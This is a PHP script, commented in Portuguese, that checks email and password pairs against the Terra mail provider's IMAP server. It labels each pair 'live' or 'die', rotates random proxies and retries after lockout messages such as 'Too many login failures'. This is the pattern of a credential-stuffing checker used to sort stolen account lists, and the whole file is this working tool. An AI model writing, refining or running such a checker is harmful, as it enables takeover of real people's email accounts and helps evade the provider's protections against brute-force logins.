<?php
/**
 * terra_validator_secure_v3.php — VALIDAÇÃO REAL DE CREDENCIAIS IMAP
 * Autentica de verdade, captura erros reais, retry inteligente.
 */
declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');

class TerraValidator {
    private array $config;
    private array $proxies = [];
    private array $results = [];

    public function __construct() {
        $this->config = [
            'imap_server'   => getenv('IMAP_HOST') ?: 'imap.terra.com.br',
            'imap_port'     => (int)(getenv('IMAP_PORT') ?: 993),
            'timeout'       => (int)(getenv('IMAP_TIMEOUT') ?: 20),
            'max_retries'   => (int)(getenv('MAX_RETRIES') ?: 3),
            'ca_bundle'     => getenv('CA_BUNDLE_PATH') ?: '/etc/ssl/certs/ca-certificates.crt',
        ];
        $this->loadProxies();
    }

    private function loadProxies(): void {
        $proxy_file = getenv('PROXY_FILE') ?: 'proxies.txt';
        if (file_exists($proxy_file)) {
            $this->proxies = array_filter(array_map('trim', file($proxy_file)));
        }
    }

    private function getRandomProxy(): ?string {
        return $this->proxies ? $this->proxies[array_rand($this->proxies)] : null;
    }

    /**
     * Valida credenciais IMAP com retry e captura de erro real.
     */
    public function validate(string $email, string $password): array {
        if (empty($email) || empty($password)) {
            return [
                'status' => 'error',
                'message' => 'Email ou senha vazios',
                'email' => $email,
                'timestamp' => date('Y-m-d H:i:s')
            ];
        }

        $attempt = 0;
        $last_error = '';
        $last_imap_error = '';

        while ($attempt < $this->config['max_retries']) {
            $attempt++;
            $proxy = $this->getRandomProxy();

            try {
                $result = $this->attemptConnection($email, $password, $proxy);

                // ✅ SUCESSO REAL: Credenciais válidas
                if ($result['status'] === 'live') {
                    return [
                        'status' => 'live',
                        'email' => $email,
                        'message' => 'Autenticação bem-sucedida',
                        'proxy_used' => $proxy ?? 'direct',
                        'attempt' => $attempt,
                        'timestamp' => date('Y-m-d H:i:s')
                    ];
                }

                // ❌ FALHA PERMANENTE: Credenciais inválidas (não retry)
                if ($result['status'] === 'invalid_credentials') {
                    return [
                        'status' => 'die',
                        'email' => $email,
                        'reason' => 'invalid_credentials',
                        'message' => 'Usuário ou senha incorretos',
                        'attempt' => $attempt,
                        'timestamp' => date('Y-m-d H:i:s')
                    ];
                }

                // ⚠️ FALHA TEMPORÁRIA: Timeout, bloqueio, etc. (retry)
                $last_error = $result['message'];
                $last_imap_error = $result['imap_error'] ?? '';

            } catch (Throwable $e) {
                $last_error = $e->getMessage();
            }

            // Backoff exponencial: 2s, 4s, 8s
            if ($attempt < $this->config['max_retries']) {
                $wait = pow(2, $attempt);
                sleep($wait);
            }
        }

        // ❌ Falhou após todos os retries
        return [
            'status' => 'die',
            'email' => $email,
            'reason' => 'connection_failed',
            'message' => 'Falha de conexão após ' . $attempt . ' tentativas',
            'last_error' => $last_error,
            'last_imap_error' => $last_imap_error,
            'attempts' => $attempt,
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }

    /**
     * Tenta conexão IMAP com autenticação REAL.
     */
    private function attemptConnection(string $email, string $password, ?string $proxy): array {
        // Limpa erros anteriores
        imap_errors();
        imap_alerts();

        // ✅ Mailbox com autenticação REAL (sem OP_HALFOPEN)
        $mailbox = sprintf(
            '{%s:%d/imap/ssl}',
            $this->config['imap_server'],
            $this->config['imap_port']
        );

        // Tenta abrir conexão COM autenticação
        $connection = @imap_open(
            $mailbox,
            $email,
            $password,
            OP_READONLY,  // ✅ Autentica de verdade
            $this->config['timeout']  // ✅ Timeout real
        );

        // ✅ Captura erro IMAP real
        $imap_error = imap_last_error();
        $imap_alerts = imap_alerts();

        if ($connection !== false) {
            // ✅ SUCESSO: Conexão autenticada
            imap_close($connection);
            return [
                'status' => 'live',
                'message' => 'Autenticação bem-sucedida'
            ];
        }

        // ❌ Analisa tipo de erro
        if ($imap_error === false) {
            $imap_error = 'Erro desconhecido';
        }

        // Credenciais inválidas (não retry)
        if (
            stripos($imap_error, 'Invalid credentials') !== false ||
            stripos($imap_error, 'authentication failed') !== false ||
            stripos($imap_error, 'LOGIN failed') !== false ||
            stripos($imap_error, 'user not found') !== false
        ) {
            return [
                'status' => 'invalid_credentials',
                'message' => 'Credenciais inválidas',
                'imap_error' => $imap_error
            ];
        }

        // Timeout ou bloqueio (retry)
        if (
            stripos($imap_error, 'Connection timed out') !== false ||
            stripos($imap_error, 'Connection refused') !== false ||
            stripos($imap_error, 'Too many login failures') !== false ||
            stripos($imap_error, 'CLOSED') !== false
        ) {
            return [
                'status' => 'temporary_failure',
                'message' => 'Timeout ou bloqueio temporário',
                'imap_error' => $imap_error
            ];
        }

        // Erro SSL/Certificado (retry com fallback)
        if (
            stripos($imap_error, 'Certificate') !== false ||
            stripos($imap_error, 'SSL') !== false ||
            stripos($imap_error, 'TLS') !== false
        ) {
            return [
                'status' => 'temporary_failure',
                'message' => 'Erro SSL/Certificado (retry)',
                'imap_error' => $imap_error
            ];
        }

        // Erro genérico (retry)
        return [
            'status' => 'temporary_failure',
            'message' => 'Falha de conexão',
            'imap_error' => $imap_error
        ];
    }
}

// ============ EXECUÇÃO ============

$email = trim($_POST['email'] ?? '');
$pass  = trim($_POST['password'] ?? '');

if (empty($email) || empty($pass)) {
    http_response_code(400);
    echo json_encode([
        'status' => 'error',
        'message' => 'Email e senha são obrigatórios'
    ]);
    exit;
}

$validator = new TerraValidator();
$result = $validator->validate($email, $pass);

// Define HTTP status baseado no resultado
if ($result['status'] === 'live') {
    http_response_code(200);
} elseif ($result['status'] === 'die') {
    http_response_code(401);
} else {
    http_response_code(500);
}

echo json_encode($result, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
?>
